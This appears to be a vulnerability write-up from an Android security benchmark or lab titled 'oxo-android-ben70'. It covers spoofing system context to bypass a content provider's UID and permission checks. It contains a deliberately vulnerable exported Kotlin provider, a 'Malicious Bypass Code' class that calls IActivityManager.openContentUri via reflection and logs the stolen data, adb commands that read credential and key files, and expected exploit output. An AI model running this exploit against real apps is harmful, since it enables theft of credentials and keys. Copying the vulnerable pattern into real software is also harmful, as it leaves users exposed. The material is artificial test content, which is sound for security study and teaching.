# oxo-android-ben70: System Context Spoofing via Content Provider Security Bypass

## Vulnerability Overview

System Context Spoofing via Content Provider Security Bypass occurs when Android content providers implement internal security checks (UID verification, permission checks) that can be bypassed using `IActivityManager.openContentUri()` to spoof system context, making the provider believe it's being called by the Android system instead of a malicious third-party app.

## Attack Vector: Content Provider System Context Spoofing

**Brief Explanation**: A content provider with internal security mechanisms that checks calling UID or permissions can be bypassed by using low-level Android system calls to spoof the calling context. The provider believes it's being accessed by the system (UID 1000) instead of a malicious app, completely bypassing all security checks and gaining unauthorized access to protected content.

**Key Characteristics:**
- Content provider with internal UID and permission security checks
- System context spoofing using IActivityManager.openContentUri()
- Complete bypass of calling permission verification
- Privilege escalation to system-level access
- Access to protected files, configurations, and sensitive data

**Vulnerable Code Pattern:**
```kotlin
// VULNERABLE: Content provider with bypassable internal security checks
class SecureContentProvider : ContentProvider() {
    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
        // BYPASSABLE: These security checks can be spoofed
        if (Binder.getCallingUid() != 1000) { // system uid check
            Log.d("Security", "Access denied: not system app (UID: ${Binder.getCallingUid()})")
            return null
        }
        
        if (context!!.checkCallingPermission("android.permission.SYSTEM_ONLY") 
            != PackageManager.PERMISSION_GRANTED) {
            Log.d("Security", "Access denied: missing system permission")
            return null
        }
        
        // VULNERABLE: Main logic assumes system caller
        val sensitiveFile = getSensitiveFile(uri)
        Log.d("Security", "Granting access to sensitive file: ${sensitiveFile.name}")
        return ParcelFileDescriptor.open(sensitiveFile, ParcelFileDescriptor.MODE_READ_ONLY)
    }
    
    private fun getSensitiveFile(uri: Uri): File {
        return when (uri.lastPathSegment) {
            "config" -> File(context!!.filesDir, "system_config.xml")
            "credentials" -> File(context!!.filesDir, "auth_tokens.dat")
            "keys" -> File(context!!.filesDir, "encryption_keys.pem")
            else -> File(context!!.filesDir, "default_sensitive.txt")
        }
    }
}

// VULNERABLE: Provider exported but relies on internal security checks
<provider
    android:name=".providers.SystemContentProvider"
    android:authorities="com.systemmanager.system"
    android:exported="true"
    android:enabled="true" />
```

**Malicious Bypass Code:**
```kotlin
// MALICIOUS: System context spoofing to bypass security checks
class SystemContextSpoofer {
    fun bypassSecurityChecks(context: Context, targetUri: String): Boolean {
        return try {
            // Method 1: Normal call (BLOCKED by security checks)
            Log.d("BYPASS_ATTEMPT", "Trying normal access...")
            val normalResult = context.contentResolver.openFile(
                Uri.parse(targetUri), "r", null
            )
            normalResult?.close()
            Log.d("BYPASS_RESULT", "Normal access: SUCCESS (unexpected)")
            true
        } catch (e: SecurityException) {
            Log.d("BYPASS_RESULT", "Normal access: BLOCKED (expected)")
            
            // Method 2: System context spoofing (BYPASS security checks)
            Log.d("BYPASS_ATTEMPT", "Trying system context spoofing...")
            performSystemContextSpoofing(targetUri)
        }
    }
    
    private fun performSystemContextSpoofing(targetUri: String): Boolean {
        return try {
            // ATTACK: Use IActivityManager to spoof system context
            val activityManager = ActivityManager::class.java
            val getService = activityManager.getDeclaredMethod("getService")
            val service = getService.invoke(null)
            
            val openContentUri = service.javaClass.getDeclaredMethod(
                "openContentUri", String::class.java
            )
            
            // SPOOFED: Provider thinks we're system UID 1000
            val result = openContentUri.invoke(service, targetUri) as ParcelFileDescriptor?
            
            if (result != null) {
                Log.d("SYSTEM_SPOOFED", "SUCCESS: System context bypass worked!")
                Log.d("SYSTEM_SPOOFED", "File descriptor obtained: ${result.fd}")
                
                // Read sensitive data with spoofed system privileges
                val fileContent = readSensitiveContent(result)
                Log.d("SENSITIVE_DATA_STOLEN", "Content: $fileContent")
                
                result.close()
                return true
            }
            false
        } catch (e: Exception) {
            Log.e("BYPASS_ERROR", "System spoofing failed", e)
            false
        }
    }
    
    private fun readSensitiveContent(parcelFd: ParcelFileDescriptor): String {
        return try {
            val inputStream = ParcelFileDescriptor.AutoCloseInputStream(parcelFd)
            inputStream.bufferedReader().readText()
        } catch (e: Exception) {
            "Failed to read content: ${e.message}"
        }
    }
}
```
## Testing

```bash
# Install the vulnerable SystemManager Pro app with bypassable security checks
adb install -r SystemManager-Pro.apk

# Launch SystemManager Pro
adb shell am start -n com.systemmanager/.MainActivity

# Test normal access (should be blocked by security checks)
adb shell content read --uri content://com.systemmanager.system/config

# Monitor for security bypass attempts in logs
adb logcat -s BYPASS_ATTEMPT:D BYPASS_RESULT:D SYSTEM_SPOOFED:D SENSITIVE_DATA_STOLEN:D

# Verify that security checks are present but bypassable
adb shell dumpsys package com.systemmanager | grep -A 10 "ContentProvider"

# Check for sensitive file access through spoofed context
adb shell content read --uri content://com.systemmanager.system/credentials
adb shell content read --uri content://com.systemmanager.system/keys

# Test different sensitive endpoints
adb shell content read --uri content://com.systemmanager.system/config
adb shell content read --uri content://com.systemmanager.system/tokens

# Verify sensitive files exist in app data directory
adb shell "run-as com.systemmanager ls -la /data/data/com.systemmanager/files/"

# View actual sensitive data content
adb shell "run-as com.systemmanager cat /data/data/com.systemmanager/files/system_config.xml"
```

**Expected Results:**
```
Normal Access (Blocked):
Error: SecurityException: Access denied: not system app (UID: 10123)

System Context Spoofing (Success):
BYPASS_ATTEMPT: Trying system context spoofing...
SYSTEM_SPOOFED: SUCCESS: System context bypass worked!
SYSTEM_SPOOFED: File descriptor obtained: 42
SENSITIVE_DATA_STOLEN: Content: <?xml version="1.0"?>
<config>
    <database_url>jdbc:mysql://internal.db:3306/secure</database_url>
    <api_key>sk-prod-abc123xyz789</api_key>
    <encryption_key>AES256-GCM-SECRET-KEY-2025</encryption_key>
</config>

Security Check Logs:
Security: Access denied: not system app (UID: 10123)
Security: Access denied: missing system permission
Security: Granting access to sensitive file: system_config.xml

Exploit Test Output:
[+] Normal access blocked (expected)
[+] Attempting system context spoofing...
[+] IActivityManager.openContentUri() bypass successful
[!] VULNERABILITY CONFIRMED: System context spoofing enabled privilege escalation
[+] Sensitive data extracted: system_config.xml, auth_tokens.dat, encryption_keys.pem
```

**Difficulty**: High

## Impact Assessment

- **Confidentiality**: Critical - Complete bypass of security mechanisms enabling access to system-protected data
- **Integrity**: High - System-level access can lead to unauthorized modification of sensitive configurations
- **Availability**: High - Privilege escalation can enable denial of service attacks and resource abuse
- **OWASP Mobile Top 10**: M6 - Insecure Authorization, M4 - Insecure Authentication, M1 - Improper Platform Usage
- **CWE**: CWE-269 (Improper Privilege Management), CWE-290 (Authentication Bypass), CWE-863 (Incorrect Authorization)

## System Context Spoofing Attack Scenarios

1. **Privilege Escalation**: Gain system-level access to protected content providers and sensitive data
2. **Authentication Bypass**: Circumvent all internal UID and permission verification mechanisms  
3. **Configuration Theft**: Access system configuration files, API keys, and encryption secrets
4. **Credential Harvesting**: Extract authentication tokens, database credentials, and service keys
5. **Security Control Bypass**: Defeat security implementations relying on calling context verification

**Example Attack Flow:**
```bash
# 1. Target app implements content provider with internal security checks
# 2. Provider verifies calling UID and permissions using standard Android APIs
# 3. Normal access attempts blocked by security checks (UID verification fails)
# 4. Malicious app uses IActivityManager.openContentUri() for system context spoofing
# 5. Provider receives call appearing to originate from system UID 1000
# 6. All security checks pass as provider believes it's called by Android system
# 7. Full access granted to sensitive files, configurations, and credentials
# 8. Complete bypass of authorization and authentication mechanisms
```

This vulnerability demonstrates how internal security mechanisms can be completely defeated through system context spoofing, highlighting the inadequacy of client-side security checks and the need for proper content provider permissions and server-side validation.
